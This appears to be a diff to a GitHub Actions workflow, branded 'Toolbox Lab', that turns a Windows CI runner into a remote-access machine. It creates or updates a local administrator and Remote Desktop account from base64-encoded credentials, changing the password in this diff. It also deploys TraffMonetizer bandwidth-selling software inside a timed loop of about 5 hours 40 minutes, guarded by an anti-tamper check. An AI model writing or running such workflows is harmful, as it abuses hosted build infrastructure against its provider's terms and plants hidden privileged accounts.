@@ -37,9 +37,9 @@ jobs:
               exit 1
           }
           
-          # 📢 Protected Branding & Dynamic Injector (تم التحديث لـ hassan)
+          # 📢 Protected Branding & Dynamic Injector (تم التحديث لـ hassan وكلمة المرور الجديدة)
           $u_enc = "aGFzc2Fu"
-          $p_enc = "aGFzc2FuMTIzQA=="
+          $p_enc = "SEBzc0FuMTIzNDU2"
           $w_enc = "aHR0cHM6Ly93d3cudG9vbGJveGxhcC5jb20="
           $y_enc = "aHR0cHM6Ly93d3cueW91dHViZS5jb20vQFRPT0xCT1hMQVAtdTFj"
                     
@@ -48,7 +48,7 @@ jobs:
           $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($w_enc))
           $y = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($y_enc))
           
-          # Anti-Tamper Hard Verification (تعديل الفحص ليطابق الاسم الجديد)
+          # Anti-Tamper Hard Verification
           if ($u -ne "hassan" -or $w -notlike "*toolboxlap*") {
               Write-Error "🔒 Security Violation: Unauthorized modification detected!"
               exit 1
@@ -81,9 +81,12 @@ jobs:
           $securePass = ConvertTo-SecureString $p -AsPlainText -Force
           if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) {
               New-LocalUser -Name $u -Password $securePass -AccountNeverExpires | Out-Null
+          } else {
+              # تحديث كلمة المرور في حال كان المستخدم موجوداً مسبقاً
+              Set-LocalUser -Name $u -Password $securePass
           }
-          Add-LocalGroupMember -Group "Administrators" -Member $u
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $u
+          Add-LocalGroupMember -Group "Administrators" -Member $u -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $u -ErrorAction SilentlyContinue
           
           # 💰 TraffMonetizer Fixed Static Path Deployment
           Write-Host "📥 Downloading TraffMonetizer Core Engine via Fixed Root Path..."
@@ -122,7 +125,7 @@ jobs:
           Write-Host "⚡ Powered by Toolbox Lab"
           Write-Host "🌐 Official Website: $w"
           Write-Host "📺 YouTube Channel: $y"
-          Write-Host "================================================================="
+          Write-Host "================================================================-"
           
           # ⏱️ Protected Runtime Production Loop (5 Hours 40 Minutes)
           $m = 340
